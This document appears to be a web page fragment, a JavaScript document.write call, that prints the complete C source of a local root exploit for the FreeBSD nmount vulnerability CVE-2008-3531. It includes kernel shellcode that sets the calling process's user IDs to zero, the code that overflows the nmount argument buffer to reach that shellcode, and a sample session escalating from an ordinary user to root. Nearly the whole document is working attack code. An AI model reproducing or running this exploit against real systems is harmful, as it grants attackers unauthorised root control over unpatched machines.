document.write("<div class=\"commandline\">\/* <br \/>\r\n * cve-2008-3531.c -- Patroklos Argyroudis, argp at domain census-labs.com<br \/>\r\n *<br \/>\r\n * Privilege escalation exploit for the FreeBSD-SA-08:08.nmount<br \/>\r\n * (CVE-2008-3531) vulnerability:<br \/>\r\n * <br \/>\r\n * http:\/\/security.freebsd.org\/advisories\/FreeBSD-SA-08:08.nmount.asc<br \/>\r\n * http:\/\/web.nvd.nist.gov\/view\/vuln\/detail?vulnId=CVE-2008-3531<br \/>\r\n *<br \/>\r\n * For a detailed analysis see:<br \/>\r\n *<br \/>\r\n * http:\/\/census-labs.com\/news\/2009\/07\/02\/cve-2008-3531-exploit\/<br \/>\r\n * <br \/>\r\n * Sample run:<br \/>\r\n * <br \/>\r\n * [argp@leon ~]$ uname -rsi<br \/>\r\n * FreeBSD 7.0-RELEASE GENERIC<br \/>\r\n * [argp@leon ~]$ sysctl vfs.usermount<br \/>\r\n * vfs.usermount: 1<br \/>\r\n * [argp@leon ~]$ id<br \/>\r\n * uid=1001(argp) gid=1001(argp) groups=1001(argp)<br \/>\r\n * [argp@leon ~]$ gcc -Wall cve-2008-3531.c -o cve-2008-3531<br \/>\r\n * [argp@leon ~]$ .\/cve-2008-3531<br \/>\r\n * [*] vptr = 0x006e776f<br \/>\r\n * [*] calling nmount()<br \/>\r\n * nmount: Unknown error: -1036235776<br \/>\r\n * [argp@leon ~]$ id<br \/>\r\n * uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)<br \/>\r\n *<br \/>\r\n * $Id: cve-2008-3531.c,v 846ca34be34a 2009\/02\/29 11:05:02 argp $<br \/>\r\n *\/<br \/>\r\n<br \/>\r\n#include &lt;sys\/param.h&gt;<br \/>\r\n#include &lt;sys\/mount.h&gt;<br \/>\r\n#include &lt;sys\/uio.h&gt;<br \/>\r\n#include &lt;err.h&gt;<br \/>\r\n#include &lt;stdio.h&gt;<br \/>\r\n#include &lt;stdlib.h&gt;<br \/>\r\n#include &lt;string.h&gt;<br \/>\r\n#include &lt;sysexits.h&gt;<br \/>\r\n#include &lt;unistd.h&gt;<br \/>\r\n#include &lt;sys\/types.h&gt;<br \/>\r\n#include &lt;sys\/stat.h&gt;<br \/>\r\n#include &lt;sys\/mman.h&gt;<br \/>\r\n<br \/>\r\n#define BUFSIZE&nbsp;&nbsp;&nbsp;&nbsp; 249<br \/>\r\n<br \/>\r\n#define PAGESIZE&nbsp;&nbsp;&nbsp;&nbsp;4096<br \/>\r\n#define ADDR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x6e7000<br \/>\r\n#define OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1903<br \/>\r\n<br \/>\r\n#define FSNAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"msdosfs\"<br \/>\r\n#define DIRPATH&nbsp;&nbsp;&nbsp;&nbsp; \"\/tmp\/msdosfs\"<br \/>\r\n<br \/>\r\nunsigned char kernelcode[] =<br \/>\r\n\"\\x64\\xa1\\x00\\x00\\x00\\x00\"&nbsp;&nbsp; \/* movl&nbsp;&nbsp;%fs:0, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# get curthread *\/<br \/>\r\n\"\\x8b\\x40\\x04\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* movl&nbsp;&nbsp;0x4(%eax), %eax&nbsp;&nbsp;# get proc from curthread *\/<br \/>\r\n\"\\x8b\\x40\\x30\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* movl&nbsp;&nbsp;0x30(%eax),%eax&nbsp;&nbsp;# get ucred from proc *\/<br \/>\r\n\"\\x31\\xc9\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* xorl&nbsp;&nbsp;%ecx, %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # ecx = 0 *\/<br \/>\r\n\"\\x89\\x48\\x04\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* movl&nbsp;&nbsp;%ecx, 0x4(%eax)&nbsp;&nbsp;# ucred.uid = 0 *\/<br \/>\r\n\"\\x89\\x48\\x08\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* movl&nbsp;&nbsp;%ecx, 0x8(%eax)&nbsp;&nbsp;# ucred.ruid = 0 *\/<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* # return to the pre-previous function, i.e. vfs_donmount() *\/<br \/>\r\n\"\\x81\\xc4\\xe8\\x00\\x00\\x00\"&nbsp;&nbsp; \/* addl&nbsp;&nbsp;$0xe8, %esp *\/<br \/>\r\n\"\\x5b\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* popl&nbsp;&nbsp;%ebx *\/<br \/>\r\n\"\\x5e\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* popl&nbsp;&nbsp;%esi *\/<br \/>\r\n\"\\x5f\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* popl&nbsp;&nbsp;%edi *\/<br \/>\r\n\"\\x5d\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \/* popl&nbsp;&nbsp;%ebp *\/<br \/>\r\n\"\\xc3\";&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/* ret *\/<br \/>\r\n<br \/>\r\nint<br \/>\r\nmain()<br \/>\r\n{<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;void *vptr;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;struct iovec iov[6];<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;vptr = mmap((void *)ADDR, PAGESIZE, PROT_READ | PROT_WRITE,<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;if(vptr == MAP_FAILED)<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;{<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(\"mmap\");<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(EXIT_FAILURE);<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;}<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;vptr += OFFSET;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;printf(\"[*] vptr = 0x%.8x\\n\", (unsigned int)vptr);<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;memcpy(vptr, kernelcode, (sizeof(kernelcode) - 1));<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;mkdir(DIRPATH, 0700);<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[0].iov_base = \"fstype\";<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[0].iov_len = strlen(iov[0].iov_base) + 1;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[1].iov_base = FSNAME;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[1].iov_len = strlen(iov[1].iov_base) + 1;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[2].iov_base = \"fspath\";<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[2].iov_len = strlen(iov[2].iov_base) + 1;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[3].iov_base = DIRPATH;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[3].iov_len = strlen(iov[3].iov_base) + 1;<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[4].iov_base = calloc(BUFSIZE, sizeof(char));<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;if(iov[4].iov_base == NULL)<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;{<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(\"calloc\");<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rmdir(DIRPATH);<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(EXIT_FAILURE);<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;}<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;memset(iov[4].iov_base, 0x41, (BUFSIZE - 1));<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[4].iov_len = BUFSIZE;<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[5].iov_base = \"BBBB\";<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;iov[5].iov_len = strlen(iov[5].iov_base) + 1;<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;printf(\"[*] calling nmount()\\n\");<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;if(nmount(iov, 6, 0) &lt; 0)<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;{<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(\"nmount\");<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rmdir(DIRPATH);<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(EXIT_FAILURE);<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;}<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;printf(\"[*] unmounting and deleting %s\\n\", DIRPATH);<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;unmount(DIRPATH, 0);<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;rmdir(DIRPATH);<br \/>\r\n<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;return EXIT_SUCCESS;<br \/>\r\n}<\/div>");